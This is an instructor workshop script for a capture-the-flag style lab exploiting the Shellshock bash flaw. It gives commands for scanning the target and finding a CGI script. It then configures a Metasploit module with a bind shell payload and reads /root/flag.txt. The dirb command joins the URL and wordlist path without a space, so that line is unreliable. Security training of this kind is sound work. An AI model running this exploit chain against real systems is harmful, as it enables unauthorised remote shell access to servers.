
# INSTRUCTOR WORKSHOP SCRIPT: EXPLOITATION (SHELLSHOCK)

### **1. Phase: Reconnaissance & Discovery**

**Step 1: Scan for open services**
```bash
nmap -sV <IP ADDRESS>
```

**Step 2: Find the vulnerable script**
```bash
dirb http://<IP ADDR>/usr/share/wordlists/dirb/common.txt
```

**Step 3: Search for the exploit in Metasploit**
```bash
msfconsole
search cve-2014-6271
```

---

### **2. Phase: Exploitation**

**Step 4: Load and Configure Module**
```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS <IP ADDR >
set RPORT 8080
set TARGETURI /cgi-bin/vulnerable
```
**Step 5: Set Payload and Launch**
```bash
set PAYLOAD linux/x86/shell/bind_tcp
exploit
```
---

### **3. Phase: Post-Exploitation**

**Step 6: Retrieve the Flag**

```bash
whoami
cat /root/flag.txt
```

---
